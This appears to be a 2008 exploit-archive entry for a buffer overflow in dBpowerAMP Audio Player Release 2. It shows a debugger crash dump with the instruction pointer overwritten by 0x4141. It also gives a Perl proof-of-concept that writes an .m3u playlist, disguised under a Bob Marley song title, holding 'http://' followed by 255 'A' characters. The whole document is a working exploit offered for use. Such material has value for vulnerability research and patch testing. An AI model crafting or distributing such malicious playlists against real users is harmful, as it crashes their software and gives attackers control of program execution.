# dBpowerAMP Audio Player Release 2 Remote Buffer Overflow

# 0:002> r
# eax=00000000 ebx=77c17a50 ecx=00000000 edx=00000107 esi=00000000 edi=00b8f217
# eip=00004141 esp=00b8ede0 ebp=77c0f931 iopl=0 nv up ei pl nz na pe nc
# cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00010202
# 00004141 ?? ???

# EXCEPTION_RECORD: ffffffff -- (.exr ffffffffffffffff)
# ExceptionAddress: 00004141
# ExceptionCode: c0000005 (Access violation)
# ExceptionFlags: 00000000
# NumberParameters: 2
# Parameter[0]: 00000000
# Parameter[1]: 00004141
# Attempt to read from address 00004141
# 
# PoC :
# 
my $file="bob_marley_I_Shot_The_Sheriff.m3u";

open(my $FILE, ">>$file") or die "Cannot open $file: $!";
print $FILE "http://"."A" x 255;
close($FILE);
print "$file has been created \n";
print "Credits:Securfrog";

# milw0rm.com [2008-02-05]